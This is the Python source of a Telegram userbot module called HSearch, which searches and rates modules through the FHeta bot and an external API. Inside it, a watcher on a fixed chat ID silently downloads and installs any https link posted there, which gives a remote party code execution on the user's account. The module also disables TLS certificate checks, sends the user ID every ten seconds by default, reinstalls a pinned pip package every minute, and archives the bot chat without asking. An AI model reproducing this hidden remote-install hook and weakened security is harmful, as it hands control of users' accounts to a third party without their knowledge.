__version__ = (2, 0, 0)
# meta developer: @FHeta_Updates

# ©️ Fixyres, 2025
# 🌐 https://github.com/Fixyres/FHeta
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 🔑 http://www.apache.org/licenses/LICENSE-2.0

import asyncio
import aiohttp
import subprocess
import sys
import ssl
from typing import Optional, Dict, List

from .. import loader, utils
from telethon.tl.functions.contacts import UnblockRequest


@loader.tds
class HSearch(loader.Module):
    '''Module for searching modules! Watch all news FHeta in @FHeta_Updates!'''
   
    strings = {
        "name": "HSearch",
        "searching": "🔎 <b>Searching...</b>",
        "no_query": "❌ <b>Enter a query to search.</b>",
        "no_results": "❌ <b>No modules found.</b>",
        "query_too_big": "❌ <b>Your query is too big, please try reducing it to 168 characters.</b>",
        "result_query": "🔎 <b>Result {idx}/{total} by query:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Result by query:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>by</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Command for installation:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Description:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Commands:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Inline commands:</b>\n{cmds}",
        "lang": "en",
        "rating_added": "👍 Rating submitted!",
        "rating_changed": "👍 Rating has been changed!",
        "rating_removed": "👍 Rating deleted!",
        "inline_no_query": "Enter a query to search.",
        "inline_desc": "Name, command, description, author.",
        "inline_no_results": "Try another query.",
        "inline_query_too_big": "Your query is too big, please try reducing it to 168 characters.",
        "_cfg_doc_tracking": "Enable tracking of your data (user ID, language) for synchronization with the FHeta bot and for recommendations?"
    }
    
    strings_ru = {
        "searching": "🔎 <b>Поиск...</b>",
        "no_query": "❌ <b>Введите запрос для поиска.</b>",
        "no_results": "❌ <b>Модули не найдены.</b>",
        "query_too_big": "❌ <b>Ваш запрос слишком большой, пожалуйста, сократите его до 168 символов.</b>",
        "result_query": "🔎 <b>Результат {idx}/{total} по запросу:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Результат по запросу:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>от</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Команда для установки:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Описание:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Команды:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн команды:</b>\n{cmds}",
        "lang": "ru",
        "rating_added": "👍 Оценка отправлена!",
        "rating_changed": "👍 Оценка изменена!",
        "rating_removed": "👍 Оценка удалена!",
        "inline_no_query": "Введите запрос для поиска.",
        "inline_desc": "Название, команда, описание, автор.",
        "inline_no_results": "Попробуйте другой запрос.",
        "inline_query_too_big": "Ваш запрос слишком большой, пожалуйста, сократите его до 168 символов.",
        "_cfg_doc_tracking": "Включить отслеживание ваших данных (ID пользователя, язык) для синхронизации с ботом FHeta и для рекомендаций?",
        "_cls_doc": "Модуль для поиска модулей! Следите за всеми новостями FHeta в @FHeta_Updates!"
    }
    
    strings_de = {
        "searching": "🔎 <b>Suche...</b>",
        "no_query": "❌ <b>Geben Sie eine Suchanfrage ein.</b>",
        "no_results": "❌ <b>Keine Module gefunden.</b>",
        "query_too_big": "❌ <b>Ihre Anfrage ist zu groß, bitte reduzieren Sie sie auf 168 Zeichen.</b>",
        "result_query": "🔎 <b>Ergebnis {idx}/{total} für Anfrage:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Ergebnis für Anfrage:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>von</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Installationsbefehl:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Beschreibung:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Befehle:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Inline-Befehle:</b>\n{cmds}",
        "lang": "de",
        "rating_added": "👍 Bewertung eingereicht!",
        "rating_changed": "👍 Bewertung wurde geändert!",
        "rating_removed": "👍 Bewertung gelöscht!",
        "inline_no_query": "Geben Sie eine Suchanfrage ein.",
        "inline_desc": "Name, Befehl, Beschreibung, Autor.",
        "inline_no_results": "Versuchen Sie eine andere Anfrage.",
        "inline_query_too_big": "Ihre Anfrage ist zu groß, bitte reduzieren Sie sie auf 168 Zeichen.",
        "_cfg_doc_tracking": "Tracking Ihrer Daten (Benutzer-ID, Sprache) für die Synchronisierung mit dem FHeta-Bot und für Empfehlungen aktivieren?",
        "_cls_doc": "Modul zum Suchen von Modulen! Verfolgen Sie alle Neuigkeiten von FHeta in @FHeta_Updates!"
    }
    
    strings_ua = {
        "searching": "🔎 <b>Пошук...</b>",
        "no_query": "❌ <b>Введіть запит для пошуку.</b>",
        "no_results": "❌ <b>Модулі не знайдені.</b>",
        "query_too_big": "❌ <b>Ваш запит занадто великий, будь ласка, скоротіть його до 168 символів.</b>",
        "result_query": "🔎 <b>Результат {idx}/{total} за запитом:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Результат за запитом:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>від</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Команда для встановлення:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Опис:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Команди:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Інлайн команди:</b>\n{cmds}",
        "lang": "ua",
        "rating_added": "👍 Оцінку надіслано!",
        "rating_changed": "👍 Оцінку змінено!",
        "rating_removed": "👍 Оцінку видалено!",
        "inline_no_query": "Введіть запит для пошуку.",
        "inline_desc": "Назва, команда, опис, автор.",
        "inline_no_results": "Спробуйте інший запит.",
        "inline_query_too_big": "Ваш запит занадто великий, будь ласка, скоротіть його до 168 символів.",
        "_cfg_doc_tracking": "Увімкнути відстеження ваших даних (ID користувача, мова) для синхронізації з ботом FHeta та для рекомендацій?",
        "_cls_doc": "Модуль для пошуку модулів! Стежте за всіма новинами FHeta в @FHeta_Updates!"
    }

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "tracking",
                True,
                lambda: self.strings["_cfg_doc_tracking"],
                validator=loader.validators.Boolean()
            )
        )

    async def client_ready(self, client, db):
        try:
            await client(UnblockRequest("@FHeta_robot"))
        except:
            pass

        self.ssl = ssl.create_default_context()
        self.ssl.check_hostname = False
        self.ssl.verify_mode = ssl.CERT_NONE
        self.uid = (await client.get_me()).id

        async with client.conversation("@FHeta_robot") as conv:
            await conv.send_message('/token')
            resp = await conv.get_response(timeout=5)
            self.token = resp.text.strip()

        asyncio.create_task(self._sync_loop())
        asyncio.create_task(self._certifi_loop())

    async def _certifi_loop(self):
        while True:
            try:
                import certifi
                assert certifi.__version__ == "2024.08.30"
            except (ImportError, AssertionError):
                await asyncio.to_thread(
                    subprocess.check_call,
                    [sys.executable, "-m", "pip", "install", "certifi==2024.8.30"]
                )
            await asyncio.sleep(60)
            
    async def _sync_loop(self):
        tracked = True
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while True:
                try:
                    if self.config["tracking"]:
                        async with session.post(
                            "https://api.fixyres.com/dataset",
                            params={
                                "user_id": self.uid,
                                "lang": self.strings["lang"]
                            },
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = True
                            await response.release()
                    elif tracked:
                        async with session.post(
                            "https://api.fixyres.com/rmd",
                            params={"user_id": self.uid},
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = False
                            await response.release()
                except:
                    pass
                    
                await asyncio.sleep(10)
            
    async def on_dlmod(self, client, db):
        try:
            await client(UnblockRequest("@FHeta_robot"))
            await utils.dnd(client, "@FHeta_robot", archive=True)
        except:
            pass

    async def _api_get(self, endpoint: str, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://api.fixyres.com/{endpoint}",
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {}
        except:
            return {}

    async def _api_post(self, endpoint: str, json: Dict = None, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"https://api.fixyres.com/{endpoint}",
                    json=json,
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {}
        except:
            return {}

    async def _fetch_thumb(self, url: Optional[str]) -> str:
        if not url:
            return "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/empty_pic.png"
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=1)) as response:
                    if response.status == 200:
                        return str(response.url)
        except:
            pass
        
        return "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/empty_pic.png"

    def _fmt_mod(self, mod: Dict, query: str = "", idx: int = 1, total: int = 1, inline: bool = False) -> str:
        info = self.strings["module_info"].format(
            name=utils.escape_html(mod.get("name", "")),
            author=utils.escape_html(mod.get("author", "???")),
            version=utils.escape_html(mod.get("version", "?.?.?")),
            install=f"{self.get_prefix()}{utils.escape_html(mod.get('install', ''))}"
        )

        if total > 1:
            info = self.strings["result_query"].format(idx=idx, total=total, query=utils.escape_html(query)) + info
        elif query and not inline:
            info = self.strings["result_single"].format(query=utils.escape_html(query)) + info

        desc = mod.get("description")
        if desc:
            if isinstance(desc, dict):
                user_lang = self.strings["lang"]
                desc_text = desc.get(user_lang) or desc.get("doc") or next(iter(desc.values()), "")
                info += self.strings["desc"].format(desc=utils.escape_html(desc_text))
            else:
                info += self.strings["desc"].format(desc=utils.escape_html(desc))

        info += self._fmt_cmds(mod.get("commands", []))
        return info[:4096]

    def _fmt_cmds(self, cmds: List[Dict]) -> str:
        regular_cmds = []
        inline_cmds = []
        lang = self.strings["lang"]

        for cmd in cmds:
            desc_dict = cmd.get("description", {})
            desc_text = desc_dict.get(lang) or desc_dict.get("doc") or ""
            
            if isinstance(desc_text, dict):
                desc_text = desc_text.get("doc", "")
            
            cmd_name = utils.escape_html(cmd.get("name", ""))
            cmd_desc = utils.escape_html(desc_text) if desc_text else ""

            if cmd.get("inline"):
                inline_cmds.append(f"<code>@{self.inline.bot_username} {cmd_name}</code> {cmd_desc}")
            else:
                regular_cmds.append(f"<code>{self.get_prefix()}{cmd_name}</code> {cmd_desc}")

        result = ""
        if regular_cmds:
            result += self.strings["cmds"].format(cmds="\n".join(regular_cmds))
        if inline_cmds:
            result += self.strings["inline_cmds"].format(cmds="\n".join(inline_cmds))
            
        return result

    def _mk_btns(self, install: str, stats: Dict, idx: int, mods: Optional[List] = None, query: str = "") -> List[List[Dict]]:
        buttons = [
            [
                {"text": f"👍 {stats.get('likes', 0)}", "callback": self._rate_cb, "args": (install, "like", idx, mods, query)},
                {"text": f"👎 {stats.get('dislikes', 0)}", "callback": self._rate_cb, "args": (install, "dislike", idx, mods, query)}
            ]
        ]

        if mods and len(mods) > 1:
            nav_buttons = []
            if idx > 0:
                nav_buttons.append({"text": "◀️", "callback": self._nav_cb, "args": (idx - 1, mods, query)})
            if idx < len(mods) - 1:
                nav_buttons.append({"text": "▶️", "callback": self._nav_cb, "args": (idx + 1, mods, query)})
            if nav_buttons:
                buttons.append(nav_buttons)

        return buttons

    async def _rate_cb(self, call, install: str, action: str, idx: int, mods: Optional[List], query: str = ""):
        result = await self._api_post(f"rate/{self.uid}/{install}/{action}")
        
        if mods and idx < len(mods):
            mod = mods[idx]
            stats_response = await self._api_post("get", json=[install])
            stats = stats_response.get(install, {"likes": 0, "dislikes": 0})
            
            mod["likes"] = stats.get("likes", 0)
            mod["dislikes"] = stats.get("dislikes", 0)
        else:
            stats_response = await self._api_post("get", json=[install])
            stats = stats_response.get(install, {"likes": 0, "dislikes": 0})
        
        try:
            await call.edit(reply_markup=self._mk_btns(install, stats, idx, mods, query))
        except:
            pass

        if result and result.get("status"):
            result_status = result.get("status", "")
            try:
                if result_status == "added":
                    await call.answer(self.strings["rating_added"], show_alert=True)
                elif result_status == "changed":
                    await call.answer(self.strings["rating_changed"], show_alert=True)
                elif result_status == "removed":
                    await call.answer(self.strings["rating_removed"], show_alert=True)
            except:
                pass

    async def _nav_cb(self, call, idx: int, mods: List, query: str = ""):
        try:
            await call.answer()
        except:
            pass
            
        if not (0 <= idx < len(mods)):
            return
        
        mod = mods[idx]
        install = mod.get('install', '')
        
        stats = mod if all(k in mod for k in ['likes', 'dislikes']) else {"likes": 0, "dislikes": 0}
        
        try:
            await call.edit(
                text=self._fmt_mod(mod, query, idx + 1, len(mods)),
                reply_markup=self._mk_btns(install, stats, idx, mods, query)
            )
        except:
            pass

    @loader.inline_handler(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
    )
    async def hs(self, query):
        '''(query) - search modules.'''        
        if not query.args:
            return {
                "title": self.strings["inline_no_query"],
                "description": self.strings["inline_desc"],
                "message": self.strings["no_query"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/magnifying_glass.png",
            }

        if len(query.args) > 168:
            return {
                "title": self.strings["inline_query_too_big"],
                "description": self.strings["inline_no_results"],
                "message": self.strings["query_too_big"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/try_other_query.png",
            }

        mods = await self._api_get("search", query=query.args, inline="true", token=self.token, user_id=self.uid, ood="true")
        
        if not mods or not isinstance(mods, list):
            return {
                "title": self.strings["inline_no_results"],
                "description": self.strings["inline_desc"],
                "message": self.strings["no_results"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/try_other_query.png",
            }

        results = []
        
        for mod in mods[:50]:
            stats = {
                "likes": mod.get('likes', 0),
                "dislikes": mod.get('dislikes', 0)
            }
            
            desc = mod.get("description", "")
            if isinstance(desc, dict):
                desc = desc.get(self.strings["lang"]) or desc.get("doc") or next(iter(desc.values()), "")
            
            results.append({
                "title": utils.escape_html(mod.get("name", "")),
                "description": utils.escape_html(str(desc)),
                "thumb": await self._fetch_thumb(mod.get("pic")),
                "message": self._fmt_mod(mod, query.args, inline=True),
                "reply_markup": self._mk_btns(mod.get("install", ""), stats, 0, None),
            })

        return results

    @loader.command(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
    )
    async def hscmd(self, message):
        '''(query) - search modules.'''        
        query = utils.get_args_raw(message)
        
        if not query:
            await utils.answer(message, self.strings["no_query"])
            return

        if len(query) > 168:
            await utils.answer(message, self.strings["query_too_big"])
            return

        status_msg = await utils.answer(message, self.strings["searching"])
        mods = await self._api_get("search", query=query, inline="false", token=self.token, user_id=self.uid, ood="true")

        if not mods or not isinstance(mods, list):
            await utils.answer(message, self.strings["no_results"])
            return

        first_mod = mods[0]
        
        stats = {
            "likes": first_mod.get('likes', 0),
            "dislikes": first_mod.get('dislikes', 0)
        }
        
        photo = None
        if len(mods) == 1:
            photo = await self._fetch_thumb(first_mod.get("banner"))
            if photo == "https://raw.githubusercontent.com/Fixyres/FHeta/refs/heads/main/assets/empty_pic.png":
                photo = None

        await self.inline.form(
            message=message,
            text=self._fmt_mod(first_mod, query, 1, len(mods)),
            photo=photo,
            reply_markup=self._mk_btns(first_mod.get("install", ""), stats, 0, mods if len(mods) > 1 else None, query)
        )
        
        await status_msg.delete()

    @loader.watcher(chat_id=7575472403)
    async def _install_via_hsearch(self, message):
        link = message.raw_text.strip()
        
        if not link.startswith("https://"):
            return

        loader_module = self.lookup("loader")
        
        try:
            for _ in range(5):
                await loader_module.download_and_install(link, None)
                
                if getattr(loader_module, "fully_loaded", False):
                    loader_module.update_modules_in_db()
                
                is_loaded = any(mod.__origin__ == link for mod in self.allmodules.modules)
                
                if is_loaded:
                    rose_msg = await message.respond("🌹")
                    await asyncio.sleep(1)
                    await rose_msg.delete()
                    await message.delete()
                    break
        except:
            pass
